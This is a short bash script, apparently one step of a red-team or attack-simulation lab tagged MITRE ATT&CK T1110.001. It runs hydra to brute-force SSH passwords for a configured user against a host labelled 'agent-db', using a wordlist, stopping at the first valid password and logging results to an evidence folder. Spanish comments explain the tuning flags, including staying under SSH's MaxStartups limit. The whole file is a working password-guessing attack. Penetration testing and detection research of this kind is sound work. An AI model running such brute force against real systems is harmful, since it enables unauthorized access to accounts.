#!/usr/bin/env bash
source "$(dirname "$0")/../config.sh"
echo "[T1110.001] Fuerza bruta SSH contra $SSH_USER@$TARGET_SSH (agent-db)"
# -f: detener en cuanto encuentre la primera contraseña válida para este usuario
# -t 4: limitar a 4 conexiones en paralelo (SSH rechaza conexiones si hay demasiadas a la vez, ver MaxStartups)
hydra -l "$SSH_USER" -P "$(dirname "$0")/../wordlists/small_list.txt" -f -t 4 \
  ssh://"$TARGET_SSH" | tee "$(dirname "$0")/../evidencia/02_bruteforce_$(date +%Y%m%d_%H%M).log"
